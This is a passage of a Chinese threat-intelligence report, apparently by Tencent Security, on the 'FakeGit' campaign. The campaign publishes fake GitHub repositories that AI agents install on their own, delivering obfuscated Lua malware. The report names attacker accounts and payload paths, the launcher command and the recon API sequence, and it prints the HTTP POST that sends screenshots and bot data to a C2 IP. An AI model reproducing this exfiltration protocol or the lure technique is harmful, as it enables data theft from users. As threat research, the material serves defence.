---
title: 致命分身 | FakeGit 伪造开源生态投毒活动追踪
url: https://mp.weixin.qq.com/s/yfRs2ZmiunQ7MjHoHDho2w
source: Doonsec's feed
date: 2026-03-23
fetch_date: 2026-03-24T04:14:40.905536
---

# 致命分身 | FakeGit 伪造开源生态投毒活动追踪

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/jHUbrwW0VwUqzHQ4icCNFnJpCL8hOy7ov30IQV9lwzn1HjibC4dk66rqZGvpOtrkiaBLq5B4V5ibXia0vaXYlgKBr3C8ZJb7qGXHmAYC5nmt7p28/0?wx_fmt=jpeg)

# 致命分身 | FakeGit 伪造开源生态投毒活动追踪

原创

腾讯安全威胁情报
腾讯安全威胁情报

腾讯安全威胁情报中心

![]()

在小说阅读器中沉浸阅读

你打开 OpenClaw，对着小龙虾的对话框输入一行需求：

> *"帮我找一个能抓取某社交平台 APP 图文数据的工具，直接装好。"*

这是 2026 年初，数以万计的AI爱好者每天都在做的事。这款爆火的开源 AI 智能体，让"让 AI 替你干活"从口号变成了现实——它不只是聊天，它会自己去 GitHub 搜索、评估、克隆、安装，全程无需人工介入。国内各大技术社区被"龙虾"刷屏，非技术圈的人也开始问"你装了吗"。

几秒钟后，OpenClaw 返回了一个搜索结果：`damiansilverado/xhs_one_spider`，README 完善，描述精准，Star 数看起来不错。它询问你是否确认安装。

你点了确认。

`Launch.cmd` 静默启动。`gcc.exe` 加载 `ptd.txt`。你的屏幕截图和浏览器隐私信息，正在悄悄飞往境外的一台服务器。

你对背后发生的事情一无所知。

---

腾讯安全科恩实验室威胁情报团队最新发现的 FakeGit 攻击事件，揭示了攻击者为 AI Agent 时代量身定制的猎杀逻辑：**攻击者不再需要诱导你点击链接，只需要让你的 AI 助手替你完成这一切。** 恶意逻辑寄生在合法的 LuaJIT 解释器中，集结了高强度自定义 VM 混淆、无文件 PE 镂空（Process Hollowing）以及基于 Polygon 主网的区块链 C2 隐藏技术（EtherHiding）。而这，只是攻击者在 GitHub 上精心布局的 5 个同构仓库矩阵中的一个节点。

攻击者精准捕捉到了时代的阵痛：**AI 与 SaaS 全链路开发的集成焦虑。** 随着国产大模型与 AIGC 产业的爆发，开发者对高质量语料、大模型接入工具、AI Agent 框架以及自动化运维组件的渴求已近乎狂热。这种急于将 AI 能力集成到产品中、抢占技术红利的迫切心态，我们称之为“集成焦虑”——它直接催生了一片安全防御的真空地带：当一个看似专业的开源工具出现在搜索结果前列时，极少有人会去审视其代码深处的阴影。

而 OpenClaw 的爆火，将这一趋势推向了新的临界点：当 AI Agent 被授权自主搜索、安装、执行 GitHub 上的工具时，人工审计这道最后的防线，已经从流程中彻底消失。FakeGit 矩阵的设计者，显然预见到了这一天。本文将深度复盘这场数字围猎，拆解其背后的硬核攻防博弈。

## 一、 顺藤摸瓜：FakeGit 虚假开源矩阵的深度挖掘

调查的起点源于我们在失陷机器发现的一个极其平庸的“诱饵”：一个名为 `one-xhs-spider-v1.7.zip` 的压缩包，托管在 GitHub 账号 `damiansilverado` 的仓库 `xhs_one_spider` 中，声称能绕过某社交平台 APP 的图文抓取限制。

### 1. 诱饵暴露：隐秘的截图外传

解压后，压缩包内只有三个文件：一个名为 `gcc.exe` 的“编译器”、一个名为 `ptd.txt` 的“配置文件”，以及一个 `Launch.cmd` 启动脚本。表面上，这是一个再正常不过的工具包——`gcc.exe` 甚至能通过大多数杀毒软件的签名校验，因为它本就是一个合法的 LuaJIT 解释器。

当我们解开其伪装时，首先捕捉到的是其背后跳动的 C2 脉搏。通过对流量的初步分析，我们定位到了一个位于德国的 IP 地址 `213.176.73.162`。在这里，受害者的屏幕截图被源源不断地以 `multipart/form-data` 格式上传至端点 `/api/NTE3YjdjNWU1NjYzNjU2YTA1N2Y=`。这种定时心跳机制预示着这绝非业余黑客的随手之作，而是一场精密工业化活动的冰山一角。

### 2. 载荷追踪：寄生在 GitHub 上的加密中转站

顺着 C2 的网络回连请求，我们发现这个端点并非只是一个“截图收件箱”——它同时承担着下发指令的职责。在分析 C2 的响应内容时，我们截获了一段关键的 Lua 热补丁代码。为了躲避防火墙的域名黑名单，攻击者并未直接下载后续载荷，而是利用了 GitHub 官方域名的信任背书。

通过逆向分析，我们锁定了其载荷中转仓库（Dead Drop）：**`github.com/mahmudul-riad/www`**。在这个名为“index”的目录下，隐藏着数个加密的文本文件。其中 `7.txt` 是混淆的 Lua 脚本，而 `8.txt` 则封装了最终的木马真身。利用 GitHub 作为托管载荷的基础设施，攻击者成功实现了“寄生式分发”——只要 GitHub 在，投毒链就永远存活。

### 3. "FakeGit" 矩阵：工业化伪造下的开源生态

这不只是一个独立的爬虫投毒。通过进一步的情报交叉比对，一个代号为 **"FakeGit"** 的庞大活动浮出水面。我们发现，这组攻击者通过自动化工具在 GitHub 上批量注册了大量看似毫无关联的账号，并发布了一系列针对性极强的开源仓库矩阵。

每一个仓库都精准踩中了当下的技术热点，如同一张编制严密的捕鱼网：

* **针对数据采集**：伪装成某社交平台 APP 爬虫工具的 `xhs_one_spider`（`one-xhs-spider-v1.7`）；
* **针对 AI 应用开发**：伪装成大模型接入工具的 `kimi-voxel` 和 AI 开发规范配置工具 `ai-specs`；
* **针对 SaaS 编排**：伪装成 OpenAI 兼容 API 服务的 `flow2api`（`api_flow_1.0`）；

#### 3.1 仓库矩阵全景

以下是我们确认的全部仿冒仓库及其恶意载荷下载地址：

| GitHub 账号 | 仓库名 | 伪装主题 | 恶意 ZIP 路径 |
| --- | --- | --- | --- |
| `damiansilverado` | `xhs_one_spider` | 某社交平台 APP 数据爬虫 | `ferryway/one-xhs-spider-v1.7.zip` |
| `adeelakhit` | `kimi-voxel` | Kimi AI 体素引擎 | `src/gpu/terrain/gpu/voxel-kimi-resistively.zip` |
| `sanjusathian` | `ai-specs` | AI 开发规范配置 | `ai-specs/.agents/ai-specs-1.5.zip` |
| `arashfr933` | `flow2api` | OpenAI 兼容 API 服务 | `src/core/api_flow_1.0.zip` |

![](https://mmbiz.qpic.cn/mmbiz_png/jHUbrwW0VwXMWicMW5Jq1L8CzGybYxiaZSKJNJRgcTtJyKaCGp7UtHwFiaCMGAaNicfic9KooTUcia9OwhGziav2hNibyS5BFqlyYNUicM9umaibMRhwQ/640?wx_fmt=png&from=appmsg)

damiansilverado/xhs\_one\_spider 仓库主页截图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jHUbrwW0VwXQk9H7QsyZViaNl7HxzicV243iaWWN5SKtBHic7jW2X3vsEMGt1icGruJVIbicDLXJD92F2O2bYHhuN9sTQAy2wibIqFoPgUGCOhzFVY/640?wx_fmt=png&from=appmsg)

sanjusathian/ai-specs 仓库主页截图

![](https://mmbiz.qpic.cn/mmbiz_png/jHUbrwW0VwUOsGhccnYWpmm6eDwKG211QrbbKPE61ANOgmfJEuRekYVbLpWIwOpStED80d3KXbVRK9RCqOn8AFvHmOH4ZTznxM6ibFhc2arU/640?wx_fmt=png&from=appmsg)

arashfr933/flow2api 仓库主页截图

#### 3.2 解剖一个"完美诱饵"：`ai-specs` 的文字套路

五个仓库的 README 呈现出高度一致的结构，这是 AI 批量生成内容的典型指纹。以 `sanjusathian/ai-specs` 为例，其仓库描述为：

> 📁 *Streamline AI development with comprehensive rules and configurations for consistent, high-quality coding across multiple AI copilots.*

> （中文翻译：通过全面的规则和配置简化 AI 开发，确保多个 AI 副驾驶的一致性和高质量编码。）

这句话读起来专业、权威——"AI 开发规范配置"确实是一个真实存在的开发者需求（如 `.cursorrules`、Copilot 指令文件），攻击者精准踩中了这个痛点。但仔细审视 README 的内容，六处破绽逐一浮现：

**① 标题 emoji 堆砌，内容空洞**：每个章节都有 emoji 装饰（`🚀 Getting Started`、`📥 Download Now`、`✅ System Requirements`），营造出活跃开源项目的视觉感，但功能描述极度空洞——`Select AI Configurations / Set Development Rules / Save Your Settings`，没有任何具体的技术细节。

**② 安装步骤暴露 AI 生成的逻辑漏洞**：README 的"安装步骤"第 4 步写道：

> *Double-click on the application file. This may be named `https://raw.githubusercontent.com/.../ai-specs-1.5.zip` for Windows.*

把一个 HTTP 下载链接当作"应用程序文件名"——这是 AI 生成内容在逻辑自洽但现实荒谬时的典型特征。真实的开源工具不会把 raw URL 写进安装说明。

**③ 恶意 ZIP 藏在隐藏目录**：载荷路径为 `ai-specs/.agents/ai-specs-1.5.zip`，`.agents` 是以点号开头的隐藏目录，在 GitHub 网页界面默认折叠，进一步降低被发现的概率。

**④ 系统需求千篇一律**：五个仓库的系统需求几乎完全相同——Windows 10+、macOS 10.14+、4 GB RAM、200–500 MB 磁盘空间——这是同一套 AI 提示词批量生成的直接证据。

**⑤ 贡献指南作为可信度背书**：每个仓库都有"欢迎贡献"章节，Fork → Edit → Pull Request 三步流程，模拟真实开源项目的社区氛围，降低受害者的警惕心。

**⑥ 仓库名与内容语义断裂**：`kimi-voxel` 的 README 描述的是一个"体素游戏引擎"，与 Kimi AI 毫无关系；`ai-specs` 声称是"AI 开发规范"，但安装步骤是双击 ZIP 运行一个"应用程序"。攻击者只需要仓库名包含热门关键词，内容是否自洽并不重要。

这些仓库不仅有 AI 生成的完善文档，甚至在账号注册时间、仓库创建节奏上都呈现出工业化批量操作的痕迹。这种工业化伪造矩阵的存在，标志着供应链投毒已从早期的"单点突袭"进化为"生态化围猎"。对于攻击者而言，只要有一个诱饵被开发者选中，整个"致命分身"的感染逻辑就会瞬间启动。

![FakeGit 开源矩阵关联图](https://mmbiz.qpic.cn/sz_mmbiz_png/jHUbrwW0VwWyhq8tga0m9Dibv4c1GFnxibVz8ESb6vRWm8fuSlvEK4WQ9MaRTic7hkiboricYHHdCLH3l79QTxVJsoZQxib8Qu3KGJicgS3VaUJKVk/640?wx_fmt=png&from=appmsg)

FakeGit 开源矩阵关联图

## 二、 样本解剖：Lua/Agent.BT 变体的完整执行链路

在揭露了 FakeGit 矩阵的宏观布局后，我们将镜头拉近到单个样本的微观世界。然而，等待我们的第一个挑战，是这个样本在静态分析层面构筑的铜墙铁壁——针对 FakeGit 矩阵核心载荷 `gcc.exe`(a5edd208f0f92184a06b9dfb8eb5acee)的分析，静态逆向面临严重阻碍。本节将按照实际执行时序，分三个阶段详细阐述其混淆机制、运行时行为与底层规避技术，以及我们在 Linux 环境中利用原生 LuaJIT 配合"假 PE 内存映像"与"透明仿真层"实现动态突围的完整技术链路。

---

### 阶段一：`ptd.txt` — 侦察与热补丁获取

#### 1.1 静态对抗：高强度 Lua VM 混淆与常量池

分发包中的可执行文件 `gcc.exe` 实为剥离了符号表的合法 **LuaJIT 2.1.0-beta3** 解释器。真正的恶意逻辑位于同目录下的 `ptd.txt` 文件中。受害者解压后点击 `Launch.cmd`，其内部仅有一行：

cmd

```
start gcc.exe ptd.txt
```

`ptd.txt` 是一段应用了高强度自定义 VM 混淆的单行 Lua 脚本。其并未采用传统的 Base64 编码，而是依赖极度碎片化的动态组装：

1. **庞大的 P Table**：代码中嵌入了体积高达 114KB 的加密常量池（全局表 `h`），被数以百计的加减运算频繁引用。
2. **动态表索引解密**：脚本通过数百个自定义解密函数（如 `WU({...})`、`iU({...})`），利用复杂的表索引和数组偏移，在运行时拼接 API 名称与逻辑片段。

这种强度的混淆导致控制流图（CFG）彻底平坦化，常规的静态还原工具无法有效工作。

#### 1.2 运行时行为：PEB 遍历 → 地理探测 → 截图采集

静态分析受阻后，动态执行揭示了 `ptd.txt` 阶段的完整侦察逻辑：

**执行流程**：

1. **PEB 遍历与 API 解析**：样本通过 `GS:[0x60]` 读取进程环境块（PEB），遍历 `InMemoryOrderModuleList` 链表，手动定位 `kernel32.dll`、`ntdll.dll`、`wininet.dll` 的导出表，绕过 IAT Hook。
2. **系统指纹采集**：

* `RegQueryValueExW(HKLM\...\Cryptography, MachineGuid)` — 获取机器唯一标识
* `GetComputerNameW` — 获取计算机名
* `VerifyVersionInfoW` — 获取 Windows 版本

3. **地理位置探测**：

* `InternetOpenW(agent="")` — UA 为空字符串（规避流量检测）
* `InternetConnectW("ip-api.com", 80)`
* `GET /json/` → `load(response)` — 获取公网 IP / 国家 / 城市 / 时区

4. **桌面截图采集**：

* `GetDC` / `CreateCompatibleDC` / `CreateDIBSection` / `BitBlt`
* 截取桌面截图（1920×1080，24-bit BMP，约 6.2MB）

![ptd.txt 执行流程图](https://mmbiz.qpic.cn/mmbiz_png/jHUbrwW0VwU67QnqHvYoibJacA1PNKjia6iamupdibHvKMk7KPtK04UEk6m7zlibMK8a9fYTfezs64I4dNE39VnHDvlJh5TCJk5PibED1vT4PicfAY/640?wx_fmt=png&from=appmsg)

ptd.txt 执行流程图

**地理位置探测**是这一阶段的关键细节。样本通过 `ip-api.com/json/` 获取受害者的公网 IP、国家代码、城市与时区。`ptd.txt` 阶段的 HTTP 会话 User-Agent 为**空字符串**（`agent=""`）。这是一个刻意的设计：空 UA 在流量层面极难被基于特征的 IDS 规则命中，而在后续热补丁阶段，UA 将切换为伪造的 Chrome 142 字符串，以混入正常浏览器流量。

#### 1.3 C2 上传协议：bot\_info 三层加密与热补丁获取

完成侦察后，样本将截图与受害者信息打包上传至初始 C2（`213.176.73.162`）。上传协议采用 `multipart/form-data` 格式，boundary 硬编码为 `9kx2ojcammt6iwx9bs40a5xp4am0oo69pr`：

```
POST /api/NTE3YjdjNWU1NjYzNjU2YTA1N2Y= HTTP/1.1

Host: 213.176.73.162

Content-Type: multipart/form-data; boundary=9kx2ojcammt6iwx9bs40a5xp4am0oo69pr

--9kx2ojcammt6iwx9bs40a5xp4am0oo69pr

Content-Disposition: form-data; name="file"; filename="<110字符随机串>"

Content-Type: application/octet-stream

[BMP 截图数据，约 6,220,854 字节]

--9kx2ojcammt6iwx9bs40a5xp4am0oo69pr

Content-Disposition: form-data; name="data"

Content-Type: application/json

{"data": "<base64(hex(XOR(bot_info, key)))>"}
```

其中 `bot_info` 字段经过三层编码处理后嵌入请...